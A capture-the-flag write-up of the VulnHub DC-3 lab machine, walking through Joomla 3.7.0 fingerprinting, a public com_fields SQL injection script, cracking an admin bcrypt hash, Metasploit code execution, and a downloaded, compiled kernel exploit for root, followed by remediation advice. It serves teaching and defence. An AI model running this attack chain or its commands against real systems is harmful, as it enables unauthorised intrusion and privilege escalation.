# DC-3 Write-up

> **Platform:** VulnHub, [DC-3](https://www.vulnhub.com/entry/dc-3,312/) **Machine:** DC-3 **Difficulty:** Beginner **Operating System:** Debian Linux **Author:** Ctum

---
## Overview
DC-3 is the third machine in VulnHub's DC series. Unlike DC-1 and DC-2, there is only one open port here, so this box is entirely about digging into a single vulnerable web application: Joomla 3.7.0. It covers SQL injection against a specific Joomla component, hash cracking, and a kernel exploit for the final privilege escalation, since no simple misconfiguration was available this time.

---
## Attack Path
1. Enumerated open services with Nmap and found only port 80.
2. Manually checked for common weaknesses (login SQLi, source code, robots.txt) with no results.
3. Fingerprinted the CMS as Joomla 3.7.0 using JoomScan.
4. Identified a known SQL injection vulnerability in the `com_fields` component.
5. Used a public exploit script (Joomblah) to dump the Joomla users table and extract a password hash.
6. Cracked the hash to recover admin credentials.
7. Gained remote code execution through Metasploit using the admin account.
8. Checked the local configuration file and found it led nowhere further.
9. Identified an outdated kernel version and used a public exploit to escalate to root.
10. Retrieved the final flag.

---
## Initial Enumeration

```bash
nmap -p- -sC -sV -T5 192.168.56.103 --open
```

Only one port came back open:

|Port|Service|
|---|---|
|80|HTTP|

With just one service exposed, the entire attack path had to run through the web application.

---
## Manual Web Enumeration
Before running any tools, I checked the basics manually: attempting SQL injection on the login form, reviewing the page source for anything useful, and checking for a `robots.txt`. None of these turned up anything.

---
## CMS Fingerprinting

Since the site looked like a CMS, I ran JoomScan to confirm the platform and pull whatever information it could gather.

```bash
joomscan --url http://192.168.56.104 -ec
```

The scan confirmed the site was running **Joomla 3.7.0**. It also flagged that directory listing was enabled on several paths (`administrator/components`, `administrator/modules`, `administrator/templates`, `images/banners`), found the admin login page at `/administrator/`, and enumerated a long list of installed components. Most were unremarkable, but one stood out: `com_biblestudy`, flagged with references to known SQL injection exploits, though the installed version could not be confirmed.

No `robots.txt`, no backup files, no readable config files, and no vulnerable core Joomla version were found directly from the scan.

---
## Finding the Vulnerability

With the exact version confirmed, I checked Exploit-DB for anything matching.

```bash
searchsploit joomla 3.7.0
```

```text
Joomla! 3.7.0 - 'com_fields' SQL Injection                    | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting | php/webapps/43488.txt
```

Joomla 3.7.0 is affected by a well-known unauthenticated SQL injection vulnerability in the `com_fields` component. I first tried the corresponding Metasploit module, but it required an authenticated admin session to work, which I didn't have yet. So I went looking for an alternative, unauthenticated exploit script instead.

---
## Exploiting the SQL Injection

I found a public Python script called **Joomblah** designed specifically for this vulnerability:

`https://github.com/teranpeterson/Joomblah/blob/master/joomblah.py`

```bash
python joomblah.py 192.168.56.104
```

The script automatically fetched a CSRF token, ran the SQL injection, and dumped the users table. It returned an admin account along with a bcrypt password hash:

```text
Found user ['629', 'admin', 'admin', 'freddy@norealaddress.net',
'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu', '', '']
```

---
## Cracking the Hash

The hash format was identifiable as bcrypt (`$2y$10$...`). I used an online hash identification and cracking service (hashes.com) to work against it, which recovered the plaintext password: **`snoopy`**.

With valid admin credentials in hand (`admin : snoopy`), I moved on to exploitation.

---
## Gaining Remote Code Execution

Using the recovered admin session, I went back to Metasploit and ran the Joomla exploit that previously failed without authentication. This time, a Meterpreter session opened successfully.

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

I upgraded the shell to a proper interactive TTY for better usability (tab completion, Ctrl+C handling, and so on).

---
## Post-Exploitation and Dead Ends

The initial working directory was `/var/www/html/templates/beez3`. Working back up the directory tree, I checked `/var/www/html` and found `configuration.php`, which contained the Joomla database credentials. However, the database service itself was offline, so this path led nowhere further and I moved on to privilege escalation instead.

---
## Privilege Escalation

I checked the kernel version to look for a local exploit path:

```bash
uname -r
```

```text
4.4.0-21-generic
```

That version matched a known kernel exploit. I located the corresponding package on Exploit-DB's GitLab mirror and downloaded it directly on the target-adjacent host:

```bash
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

After extracting the archive, I uploaded the exploit folder to the target's `/tmp` directory through the Meterpreter session:

```bash
upload -r /home/ctum/39772/ebpf_mapfd_doubleput_exploit /tmp
```

From there, I compiled and ran the exploit:

```bash
chmod +x compile.sh
./compile.sh

chmod +x doubleput
./doubleput
```

This dropped me straight into a root shell.

---
## Final Flag

```bash
cd /root
ls
cat the-flag.txt
```

```text
Congratulations are in order. :-)

I hope you've enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7.

Have a great day!!!!
```

Machine complete.

---
## Flags Summary

|Flag|Location|How It Was Found|
|---|---|---|
|Final|`/root/the-flag.txt`|Retrieved after kernel exploit privilege escalation|

DC-3 only contains a single flag, located in `/root` after full compromise.

---
## Remediation

- **Upgrade Joomla** past 3.7.0. The `com_fields` SQL injection is unauthenticated and well documented, making it a high priority fix.
- **Disable directory listing** on all web-accessible paths. JoomScan was able to enumerate a large number of installed components purely because directory listing was left enabled.
- **Store hashed passwords with a strong, current algorithm and unique salts**, and enforce longer, non-dictionary passwords. `snoopy` fell almost immediately to an online cracking service.
- **Restrict access to `configuration.php`** and avoid storing plaintext database credentials in a web-accessible file.
- **Keep the kernel patched.** The privilege escalation here relied entirely on a known, several-years-old kernel vulnerability. Regular patching would have closed this path completely.
- **Limit outbound access from the server**, since the exploit chain here relied on being able to fetch and compile external code directly against the target environment.

---
## Lessons Learned

- Not every vulnerability needs Metasploit. Public exploit scripts on GitHub are often just as effective, especially when a Metasploit module has stricter prerequisites (such as needing authentication).
- Directory listing left enabled can hand over a full map of installed components for free.
- A found configuration file is not always the answer. Sometimes the credentials inside lead nowhere, and it is important to keep enumerating rather than getting stuck on one lead.
- Kernel version checks should be routine during privilege escalation, especially on older, unpatched boxes.
- Hash cracking services can save time versus setting up a local wordlist attack, particularly for common algorithms like bcrypt with weak passwords.

---
## Tools Used

- Nmap
- JoomScan
- Searchsploit
- Joomblah (custom SQLi script)
- Metasploit
- hashes.com
- Kernel exploit (ebpf_mapfd_doubleput)

---
## Technologies Encountered

- Joomla 3.7.0
- Apache
- Debian Linux
- Linux kernel 4.4.0

---
## Skills Practiced

- Network Enumeration
- CMS Fingerprinting
- SQL Injection Exploitation
- Public Exploit Script Usage
- Password Hash Cracking
- Metasploit Post-Exploitation
- Linux Kernel Privilege Escalation